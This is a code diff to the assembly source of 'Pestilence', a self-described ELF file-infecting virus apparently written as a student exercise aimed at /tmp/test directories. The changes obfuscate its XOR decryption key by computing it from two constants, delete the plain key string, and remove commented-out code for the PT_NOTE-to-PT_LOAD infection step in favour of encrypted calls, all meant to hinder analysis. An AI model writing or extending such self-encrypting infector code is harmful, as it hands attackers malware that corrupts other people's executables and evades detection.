@@ -150,8 +150,9 @@ section .text
      .decrypt_data:   
         ; Desencriptar data
         lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x21336C3174733370
-        ;xor rbx, 0x5050505050505050
+        mov rbx, 0x2537683570773774
+        mov rax, 0x0404040404040404 
+        xor rbx, rax
         ; lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
         xor rdx, rdx              ; índice key
@@ -580,42 +581,18 @@ section .text
         je .munmap
 
     .ftruncate:
-        ; ftruncate(fd_file, file_final_len)
-        ; mov rdi, VAR(Pestilence.fd_file)
-        ; xor rsi, rsi
-        ; mov esi, dword VAR(Pestilence.file_final_len)
-        ; mov rax, SC_FTRUNCATE
-        ; syscall
-        ; test rax, rax
         CALL_ENCRYPT(ftruncate)
         jnz .munmap
 
     .mod_pt_note:
-        ; Pestilence.note_phdr_ptr es una dirección de memoria que apunta a un puntero
-        ; lea rax, VAR(Pestilence.note_phdr_ptr)
-        ; mov rax, [rax]
-        ; mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        ; ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
-        ; mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
-        ; mov ecx, dword VAR(Pestilence.file_final_len)
-        ; sub ecx, dword VAR(Pestilence.virus_size)
-        ; mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
-        ; mov VAR(Pestilence.virus_offset), rcx
-        ; mov rcx, VAR(Pestilence.max_vaddr_end)
-        ; ALIGN rcx
-        ; mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
-        ; mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
-        ; mov VAR(Pestilence.new_entry), rcx
-        ; mov ecx, dword VAR(Pestilence.virus_size)
-        ; mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
-        ; mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
-        ; mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
         CALL_ENCRYPT(mod_pt_note)
 
         ; Encriptar data
-    .encrypt_data    
+    .encrypt_data: 
         lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x21336C3174733370
+        mov rbx, 0x2537683570773774
+        mov rax, 0x0404040404040404 
+        xor rbx, rax
 
         ;lea rbx, [rel xor_pass]   ; key
         xor rcx, rcx              ; contador función
@@ -717,7 +694,6 @@ section .text
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     __F_data__end:
-    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
     Traza_position  equ     _finish - Traza
     Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
     host_entrypoint dq      _dummy_host_entrypoint
